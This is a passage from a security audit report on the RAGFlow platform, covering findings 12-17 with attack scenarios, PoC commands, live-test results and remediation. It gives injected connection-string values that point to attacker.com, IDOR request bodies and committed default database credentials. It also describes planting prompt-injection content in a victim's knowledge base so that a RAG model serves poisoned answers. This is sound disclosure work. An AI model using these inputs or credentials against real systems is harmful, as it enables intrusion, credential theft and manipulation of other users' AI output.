- `SandboxedEnvironment` has had confirmed bypasses in the past (CVE-2019-10906 in Jinja2 < 2.10.1). The sandbox is a denylist-based approach that must be updated for each new bypass technique.
- Exceptions from failed template rendering are silently swallowed (line 104 in `string_transform.py`, line 253 in `message.py`), meaning partial bypass attempts produce no log noise.

**Attack Scenario:**

1. Attacker with agent workflow edit access creates a StringTransform or Message component.
2. Attacker provides a Jinja2 template containing a sandbox bypass payload.
3. If a future bypass is discovered in Jinja2's `SandboxedEnvironment`, the payload would execute with RAGFlow server process privileges.
4. Silent exception handling means failed bypass attempts leave no audit trail.

**PoC:** `autofyn_audit/exploits/12_jinja2_sandbox_bypass.py`
```
PYTHONPATH=/path/to/repo python autofyn_audit/exploits/12_jinja2_sandbox_bypass.py
```
Expected output: `RESULT: CONFIRMED (user-controlled SSTR confirmed, current bypasses blocked)`

**Note:** All known bypass payloads are blocked by Jinja2 3.1.6's default `SandboxedEnvironment`. This finding documents the risk surface for defense-in-depth hardening, not a currently exploitable vulnerability.

**Remediation:**

1. Add a custom `SandboxedEnvironment` security policy that restricts accessible attributes and methods to an explicit allowlist, reducing the attack surface beyond Jinja2's defaults.
2. Log template rendering failures instead of silently swallowing exceptions — this enables detection of bypass attempts.
3. Pin the Jinja2 version and monitor for new sandbox bypass CVEs.
4. Consider replacing Jinja2 templates with a simpler variable substitution mechanism if the full Jinja2 feature set is not needed.

---

### Finding 13: Unauthenticated Webhook Triggers Full Agent Execution

**Severity:** HIGH (CVSS 7.6 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H)

**Affected Component:** `api/apps/restful_apis/agent_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/agent_api.py:1058-1060` — route definition with no `@login_required`
- `api/apps/restful_apis/agent_api.py:1114-1117` — `auth_type = security_cfg.get("auth_type", "none")` and `if auth_type == "none": return`
- `api/apps/restful_apis/agent_api.py:1312` — `Canvas(dsl, cvs.user_id, agent_id)` — canvas runs under owner identity

**Description:**

The webhook endpoint accepts `POST`/`GET`/`PUT`/`PATCH`/`DELETE`/`HEAD` on `/api/v1/agents/<agent_id>/webhook` with no `@login_required` decorator. The security configuration defaults to `auth_type: "none"` (line 1114), which causes the security validator to return immediately without any authentication check (lines 1116-1117). When triggered, the endpoint creates a full Canvas execution under the agent owner's identity (line 1312: `Canvas(dsl, cvs.user_id, agent_id)`), running all configured tools (ExeSQL, Invoke, file operations) and consuming LLM API credits. While webhooks are designed for external triggers, the insecure default combined with full pipeline execution under the owner's identity creates a significant abuse vector.

**Attack Scenario:**

1. Attacker enumerates or guesses `agent_id` (UUIDs may be leaked via other endpoints or logs).
2. Attacker sends `POST /api/v1/agents/<agent_id>/webhook` with no authentication headers.
3. Full agent pipeline executes under the agent owner's identity.
4. LLM API costs are billed to the owner; configured tools execute (ExeSQL, file operations, HTTP Invoke); any agent output containing sensitive data is accessible.

**PoC:**

```bash
python autofyn_audit/exploits/13_unauth_webhook_execution.py
```

Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED (dynamic)` when server is live.

**Remediation:**

1. Change the default `auth_type` from `"none"` to `"token"`, requiring explicit opt-in for unauthenticated webhooks.
2. Require explicit configuration with a UI warning when `auth_type: "none"` is selected.
3. Add rate limiting as a mandatory (not optional) default, regardless of `auth_type`.

---

### Finding 14: ODBC/CLI Connection String Injection in MSSQL and DB2

**Severity:** HIGH (CVSS 7.4 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**Affected Component:** `agent/tools/exesql.py`

**Affected Files and Lines:**
- `agent/tools/exesql.py:136-144` — MSSQL ODBC connection string via string concatenation
- `agent/tools/exesql.py:186-195` — DB2 CLI connection string via f-string interpolation

**Description:**

The ExeSQL tool builds ODBC (MSSQL) and CLI (DB2) connection strings by concatenating user-controlled configuration values (`host`, `database`, `username`, `password`) directly into semicolon-delimited connection strings. No sanitization removes or escapes semicolons in these values. An attacker with agent workflow edit access can inject additional ODBC/CLI key-value pairs by embedding semicolons in any connection parameter. This is distinct from Finding 10 (SQL query injection via `cursor.execute()`): this finding covers connection parameter injection that executes before any SQL query, targeting the driver/connection layer.

**Attack Scenarios:**

1. `database = "mydb;SERVER=attacker.com"` — redirects connection to attacker server, capturing credentials.
2. `password = "x;TRUSTED_CONNECTION=yes"` — enables Windows integrated auth bypass.
3. `host = "legit.db;Encrypt=no;TrustServerCertificate=yes"` — disables TLS certificate verification, enabling MITM.
4. `database = "mydb;HOSTNAME=attacker.com"` (DB2) — redirects CLI connection to attacker server.

**PoC:**

```bash
PYTHONPATH=. python autofyn_audit/exploits/14_odbc_connstr_injection.py
```

Expected output: `RESULT: CONFIRMED`

**Note:** This finding is confirmed at the connection-string construction layer. The audit did not stand up attacker-controlled MSSQL or DB2 infrastructure to show credential capture end to end, so the demonstrated proof is at the exact string-building boundary rather than the full network interception stage.

**Remediation:**

1. Use parameterized connection APIs (e.g., `pyodbc.connect(driver=..., server=..., database=...)` keyword arguments) instead of string concatenation.
2. Validate all connection parameters: strip semicolons and reject values containing ODBC keywords before building connection strings.
3. For DB2, use `ibm_db.connect(database, uid, pwd)` positional arguments instead of the CLI connection string format.

---

### Finding 15: Unauthenticated Bulk Document Thumbnail Retrieval

**Severity:** HIGH (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected Component:** `api/apps/restful_apis/document_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/document_api.py:1182-1183` — route with no `@login_required`
- `api/apps/restful_apis/document_api.py:1204-1209` — `doc_ids = request.args.getlist("doc_ids")` → `DocumentService.get_thumbnails(doc_ids)` — no `tenant_id` passed
- `api/apps/restful_apis/document_api.py:1213` — response includes `kb_id` — cross-tenant metadata leak
- `api/db/services/document_service.py:769-773` — `get_thumbnails()` queries by `id` only, no tenant filter

**Description:**

The `/api/v1/thumbnails` endpoint serves thumbnail data for any document IDs without authentication or tenant authorization. It accepts bulk `doc_ids` via query parameters and calls `DocumentService.get_thumbnails(doc_ids)` with no tenant filtering — returning thumbnails for documents across all tenants. The response includes `kb_id` (knowledge base IDs), leaking internal resource identifiers. This is distinct from Finding 5 (unauthenticated image retrieval at `/documents/images/<id>`): Finding 5 requires a specific `bucket-object` pair and returns raw image bytes for a single document. This endpoint accepts bulk document UUIDs, returns structured metadata including `kb_id`, and operates cross-tenant.

**Attack Scenario:**

1. Attacker enumerates document UUIDs (predictable format, or leaked via other unauthenticated endpoints).
2. Attacker sends `GET /api/v1/thumbnails?doc_ids=<uuid1>&doc_ids=<uuid2>...` without authentication.
3. Server returns thumbnails and `kb_id` for all matching documents across all tenants.
4. Attacker harvests document thumbnail previews and maps knowledge base relationships across tenants.

**PoC:**

```bash
python autofyn_audit/exploits/15_unauth_bulk_thumbnails.py
```

Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED (dynamic)` when server is live.

**Remediation:**

1. Add `@login_required` and `@add_tenant_id_to_kwargs` decorators to the `/thumbnails` endpoint.
2. Pass `tenant_id` to `DocumentService.get_thumbnails()` and filter the query by tenant.
3. Audit all document endpoints for missing authentication decorators.

---

### Finding 16: IDOR in Tenant LLM Model Configuration Update

**Severity:** HIGH (CVSS 7.1 — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L)

**Affected Component:** `api/apps/restful_apis/user_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/user_api.py:583-630` — `PATCH /users/me/models` endpoint
- `api/apps/restful_apis/user_api.py:625` — `tid = req.pop("tenant_id")` — tenant_id from request body
- `api/apps/restful_apis/user_api.py:627` — `TenantService.update_by_id(tid, update_dict)` — no ownership check
- `api/db/services/common_service.py:267-277` — `update_by_id()` — updates by ID only, no tenant filter
- `api/utils/tenant_utils.py:29-37` — `ensure_tenant_model_id_for_params` uses attacker-supplied tenant_id

**Description:**

The `PATCH /api/v1/users/me/models` endpoint is protected by `@login_required` but accepts `tenant_id` from the request body without verifying that the supplied value matches the authenticated user's own tenant. The code extracts `tid = req.pop("tenant_id")` and immediately calls `TenantService.update_by_id(tid, update_dict)`, which issues a `WHERE id == pid` query with no ownership filter. Any authenticated user can supply an arbitrary `tenant_id` and overwrite the target tenant's LLM configuration (`llm_id`, `embd_id`, `asr_id`, `img2txt_id`), breaking or redirecting their RAG pipeline. This is a classic Insecure Direct Object Reference (IDOR) — authentication is present but authorization on the object is absent.

**Attack Scenario:**

1. Attacker registers an account or obtains a valid authentication token (PR:L).
2. Attacker discovers or guesses a victim's tenant_id (tenant IDs are UUIDs leaked in various API responses).
3. Attacker sends `PATCH /api/v1/users/me/models` with `{"tenant_id": "<victim_tenant_id>", "llm_id": "attacker-controlled-model", ...}`.
4. Server executes `TenantService.update_by_id(victim_tenant_id, ...)` without any ownership check.
5. Victim's LLM/embedding model configuration is overwritten — their RAG pipeline breaks or redirects queries through attacker-controlled model endpoints.

**PoC:**

```bash
python autofyn_audit/exploits/16_idor_tenant_model_update.py
```

Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED` when server is live.

**Remediation:**

Replace `tid = req.pop("tenant_id")` with `tid = current_user.id` so the endpoint always operates on the authenticated user's own tenant. Remove `tenant_id` from the request schema entirely — it should never be a client-supplied value.

---

### Finding 17: Cross-Tenant Knowledge Base Document Injection

**Severity:** HIGH (CVSS 7.1 — AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L)

**Affected Component:** `api/apps/restful_apis/file2document_api.py`

**Affected Files and Lines:**
- `api/apps/restful_apis/file2document_api.py:76-119` — `POST /files/link-to-datasets` endpoint
- `api/apps/restful_apis/file2document_api.py:85` — `FileService.get_by_ids(file_ids)` — no tenant parameter
- `api/apps/restful_apis/file2document_api.py:94-95` — `KnowledgebaseService.get_by_id(kb_id)` — no tenant parameter
- `api/apps/restful_apis/file2document_api.py:52-68` — `_convert_files` inserts `{"kb_id": kb.id, "created_by": user_id}` — victim KB, attacker user_id
- `api/db/services/common_service.py:281-293` — `get_by_id()` — queries by ID only, no tenant filter
- `api/db/services/common_service.py:297-308` — `get_by_ids()` — queries by ID only, no tenant filter

**Description:**

The `POST /api/v1/files/link-to-datasets` endpoint links files to knowledge bases. It is protected by `@login_required` but performs only existence checks on the supplied `file_ids` and `kb_ids` — no tenant ownership verification. `FileService.get_by_ids(file_ids)` and `KnowledgebaseService.get_by_id(kb_id)` both query by ID with no tenant filter, as does the underlying `get_by_id` / `get_by_ids` implementation in `common_service.py`. The `_convert_files()` helper then inserts a new document record with `"kb_id": kb.id` (victim's KB) and `"created_by": user_id` (attacker's user ID), injecting the attacker's file content directly into the victim's knowledge base. Victim's subsequent RAG queries return attacker-controlled poisoned content.

**Attack Scenario:**

1. Attacker registers an account or obtains a valid authentication token (PR:L).
2. Attacker uploads a malicious file (e.g., containing false information or prompt-injection payloads) and records their file's UUID.
3. Attacker discovers or enumerates a victim's knowledge base UUID (e.g., via the unauth thumbnail endpoint, or via other IDOR vectors).
4. Attacker sends `POST /api/v1/files/link-to-datasets` with `{"file_ids": ["<attacker_file_id>"], "kb_ids": ["<victim_kb_id>"]}`.
5. Server calls `KnowledgebaseService.get_by_id(victim_kb_id)` — no ownership check — then `_convert_files()` inserts a document into the victim's KB.
6. Victim's users query the compromised KB and receive attacker-controlled responses.

**PoC:**

```bash
python autofyn_audit/exploits/17_cross_tenant_kb_injection.py
```

Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED` when server is live.

**Remediation:**

Add tenant ownership checks on both `file_ids` and `kb_ids`: verify that each file and each knowledge base belongs to `current_user`'s tenant before proceeding. Specifically, filter `FileService.get_by_ids()` and `KnowledgebaseService.get_by_id()` to include a `tenant_id == current_user.id` constraint, and reject requests where any supplied ID belongs to a different tenant.

---

## Infrastructure Notes

Default credentials committed to the repository (`docker/.env`) enable direct database access:

| Service | Default Credentials |
|---------|---------------------|
| MySQL | `root` / `infini_rag_flow` |
| Redis | password: `infini_rag_flow` |
| MinIO | `rag_flow` / `infini_rag_flow` |
| Elasticsearch | `elastic` / `infini_rag_flow` |

These default credentials are referenced throughout the codebase and in Docker Compose configuration. Any deployment that does not override these values is trivially accessible from the network. Findings 2 and 4 require only MySQL write access, which these credentials provide.

**Recommendation:** Mandate credential rotation as part of the deployment process. Remove default credential values from committed configuration; use Docker secrets or environment variable injection instead.

---

## Verification Summary

All 17 findings were confirmed through two independent verification phases:

**Phase 1 — Standalone PoC Scripts (no server required for findings 1–4, 8–12, 14):**

| Finding | Method | Result |
|---------|--------|--------|
| 1 | Encrypt/decrypt with committed RSA key + passphrase `"Welcome"` | RCE confirmed — plaintext password recovered |
| 2 | Craft malicious pickle payload, trigger `deserialize_b64()` | RCE confirmed — proof file written to `/tmp/pickle_rce_proof.txt` |
| 3 | Create JWT token, verify accepted without `max_age` | Confirmed — 2-second-old token accepted indefinitely |
| 4 | Craft JSON with `subprocess.Popen`, trigger `from_dict_hook` | RCE confirmed — `id` command output captured |
| 8 | AST parse + grep of `invoke.py` | Confirmed — zero SSRF guards, internal URLs pass unchanged |
| 9 | YAML parse of compose + `SecurePythonAnalyzer` bypass | Confirmed — privileged sandbox configuration and checker bypass are both present; host-compromise impact depends on sandbox deployment |
| 10 | Regex bypass testing of DML filter | Confirmed — leading space, DROP TABLE, TRUNCATE all bypass filter |
| 11 | Source analysis of `doc-preview.tsx` | Confirmed — unsanitized `dangerouslySetInnerHTML` sink present; live browser execution not separately demonstrated |
| 12 | SandboxedEnvironment bypass testing | Confirmed — user templates are rendered server-side; current tested bypasses are blocked by Jinja2 3.1.6 |
| 14 | Connection string injection simulation | Confirmed — semicolons in MSSQL/DB2 params alter connection-string semantics before query execution |

**Phase 2 — Live HTTP Tests (against running RAGFlow instance):**

| Finding | HTTP Request | Server Response | Verdict |
|---------|-------------|-----------------|---------|
| 1 | Register user using committed RSA key | `code:0` — registration succeeded | Auth flow accepts ciphertext generated from repo-committed key material |
| 5 | `GET /api/v1/documents/images/test-test` (no auth) | `code:100` (not 401) | Route reached without auth; no real image bytes were needed for this route-level proof |
| 6 | `POST /api/v1/agents/<real_agent_id>/upload` (no auth) | **`code:0`**, file created under victim owner's ID | Real unauthenticated file write into victim-owned downloads bucket |
| 7 | `GET /api/v1/agents/download?created_by=<victim>&id=<real_file_id>` (no auth) | `HTTP 200`, uploaded bytes returned | Real unauthenticated read of victim-owned agent file |
| 13 | `POST /api/v1/agents/<real_agent_id>/webhook/test` (no auth) | `HTTP 200`, `{"message":"webhook-ran","success":true}` | Real unauthenticated webhook-triggered agent execution |
| 15 | `GET /api/v1/thumbnails?doc_ids=<real_victim_doc_id>` (no auth) | **`code:0, "success"`** | Real victim document ID accepted without any auth |
| 16 | Attacker `PATCH /api/v1/users/me/models` with victim `tenant_id` | **`code:0, "success"`**, victim `llm_id` changed | Real cross-tenant tenant-model mutation succeeded |
| 17 | Attacker `POST /api/v1/files/link-to-datasets` with own file and victim dataset | **`code:0, "success"`**, injected doc appears in victim dataset listing | Real cross-tenant document injection succeeded |

For findings 5–7, 13, and 15, the comparison endpoint (`GET /api/v1/datasets`) correctly returned `code:401` when unauthenticated, proving auth enforcement works elsewhere but is missing on the vulnerable endpoints.

For findings 16–17, authentication was obtained via the standard login flow (JWT from the `Authorization` response header) — no special access or container shell was required. The attacker path is: register → login → use JWT to hit IDOR/cross-tenant endpoints with another tenant's real ID.

---

## Reproduction Steps

### Prerequisites

```bash
# Python 3.10+ with pip
pip install pycryptodomex itsdangerous jinja2 requests

# Docker (for live confirmation)
docker --version   # Docker 20+ required
```

### Quick Start — Full Audit Suite

```bash
# From repo root
cd /path/to/ragflow

# 1. Start the audit environment (Docker services + RAGFlow server)
bash autofyn_audit/setup.sh

# 2. Run all 17 exploit PoCs + live HTTP confirmation
bash autofyn_audit/run_all.sh

# 3. Cleanup
bash autofyn_audit/teardown.sh
```

`run_all.sh` executes two phases:
- **Phase 1**: Runs all 17 standalone PoC scripts (findings 1–4 produce local RCE proof files; others perform static code analysis)
- **Phase 2**: Runs `live_confirmation.py`, registers dedicated owner/attacker/victim users, and confirms findings 5–7, 13, 15–17 via live HTTP requests

### Manual — Standalone Exploits (no Docker needed)

```bash
export PYTHONPATH=.

# RCE exploits (produce proof files in /tmp/)
python3 autofyn_audit/exploits/01_rsa_key_compromise.py
python3 autofyn_audit/exploits/02_pickle_deserialization_rce.py
python3 autofyn_audit/exploits/03_jwt_no_expiry.py
python3 autofyn_audit/exploits/04_from_dict_hook_rce.py

# Code/config analysis
python3 autofyn_audit/exploits/08_ssrf_invoke_component.py
python3 autofyn_audit/exploits/09_privileged_sandbox_escape.py
python3 autofyn_audit/exploits/10_exesql_sqli.py
python3 autofyn_audit/exploits/11_stored_xss_docx.py
python3 autofyn_audit/exploits/12_jinja2_sandbox_bypass.py
python3 autofyn_audit/exploits/14_odbc_connstr_injection.py
```

### Manual — Live HTTP Confirmation (Docker required)

```bash
# After setup.sh:
python3 autofyn_audit/live_confirmation.py --url http://localhost:9381
```

### Docker Image Pinning

The audit environment uses a pinned Docker image to ensure reproducibility:

```
infiniflow/ragflow@sha256:0698a8733efd267527b20835793e3db48416f8b8a2de3bc1c83f3c5924b4e05a
```

This image corresponds to version v0.25.0-91-gc5116b90e (2 commits before the audited commit c81081f8e). The 2-commit delta only affects document update logic and does not touch any audited endpoint, authentication mechanism, or vulnerable code path.
